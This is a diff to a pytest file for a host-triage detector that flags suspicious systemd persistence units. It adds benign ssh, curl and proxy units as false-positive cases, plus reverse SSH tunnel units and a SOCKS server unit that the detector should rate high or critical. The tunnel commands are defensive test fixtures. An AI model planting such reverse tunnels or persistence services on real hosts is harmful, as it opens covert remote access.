@@ -206,6 +206,28 @@ def test_host_triage_systemd_persistence_catches_reverse_ssh_and_volatile_stagin
         "[Service]\nExecStart=/usr/bin/ssh -N -L 5432:127.0.0.1:5432 db@internal.local\n",
         encoding="utf-8",
     )
+    # Benign remote commands over SSH containing `-r` or `-R` (must NOT FP as SSH reverse tunnel!)
+    (unit_dir / "ssh-backup-cp.service").write_text(
+        '[Service]\nExecStart=/usr/bin/ssh backup@internal.local "cp -r /srv/data /mnt/bak"\n',
+        encoding="utf-8",
+    )
+    (unit_dir / "ssh-chmod-r.service").write_text(
+        '[Service]\nExecStart=/usr/bin/ssh deploy@internal.local "chmod -R 750 /srv/app"\n',
+        encoding="utf-8",
+    )
+    # Benign outbound proxy client units using `--socks5` / `socks5://` / `socks4://` (must NOT FP as tunnel server!)
+    (unit_dir / "curl-socks5-feed.service").write_text(
+        "[Service]\nExecStart=/usr/bin/curl --socks5 10.0.0.5:1080 https://updates.internal/feed\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "env-socks5-proxy.service").write_text(
+        "[Service]\nExecStart=/usr/bin/env ALL_PROXY=socks5://proxy.corp.local:1080 /opt/app/worker\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "git-socks4-proxy.service").write_text(
+        "[Service]\nExecStart=/usr/bin/git -c http.proxy=socks4://proxy.corp.local:1080 pull\n",
+        encoding="utf-8",
+    )
     # Symlink to outside unit must be skipped safely
     outside_unit = tmp_path / "outside.service"
     outside_unit.write_text("[Service]\nExecStart=/tmp/staged_agent\n", encoding="utf-8")
@@ -246,6 +268,18 @@ def test_host_triage_systemd_persistence_catches_reverse_ssh_and_volatile_stagin
         "[Service]\nExecStart=/usr/bin/ssh \\\n  -N -R 9001:127.0.0.1:22 ops@198.51.100.5\n",
         encoding="utf-8",
     )
+    (unit_dir / "quoted-ssh-bin.service").write_text(
+        '[Service]\nExecStart="/usr/bin/ssh" -fNR8081:127.0.0.1:22 ops@198.51.100.5\n',
+        encoding="utf-8",
+    )
+    (unit_dir / "socksnode.service").write_text(
+        "[Service]\nExecStart=/usr/bin/python3 /usr/local/bin/socks5.py 127.0.0.1 10800\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "wildcard-ssh-r.service").write_text(
+        "[Service]\nExecStart=/usr/bin/ssh -N -R *:8082:127.0.0.1:80 ops@198.51.100.5\n",
+        encoding="utf-8",
+    )
 
     hits = check_systemd_persistence(root)
     by_unit = {Path(h.path_or_pid).name: h.severity for h in hits}
@@ -258,4 +292,7 @@ def test_host_triage_systemd_persistence_catches_reverse_ssh_and_volatile_stagin
         "compact-ssh-r.service": "high",
         "opt-remotefwd.service": "high",
         "multiline-ssh.service": "high",
+        "quoted-ssh-bin.service": "high",
+        "socksnode.service": "critical",
+        "wildcard-ssh-r.service": "high",
     }
